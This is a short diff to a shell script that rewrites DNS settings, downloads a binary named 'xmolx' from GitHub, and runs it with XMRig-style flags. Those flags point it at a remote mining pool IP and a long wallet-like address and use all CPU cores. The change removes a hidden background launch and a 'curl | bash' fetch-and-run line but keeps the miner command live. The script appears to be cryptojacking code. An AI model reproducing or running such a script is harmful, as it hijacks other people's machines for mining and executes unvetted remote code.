@@ -12,5 +12,4 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget https://github.com/kartolo92/jadul/raw/refs/heads/main/xmolx
 chmod +x xmolx
-./xmolx --donate-level 1 -o 167.99.139.112:80 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4aNeCaYixqvQ2Wh74Tqw5U1dcubDGpRz2y61rzdjMibQM5.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
+./xmolx --donate-level 1 -o 167.99.139.112:80 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4aNeCaYixqvQ2Wh74Tqw5U1dcubDGpRz2y61rzdjMibQM5.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all)
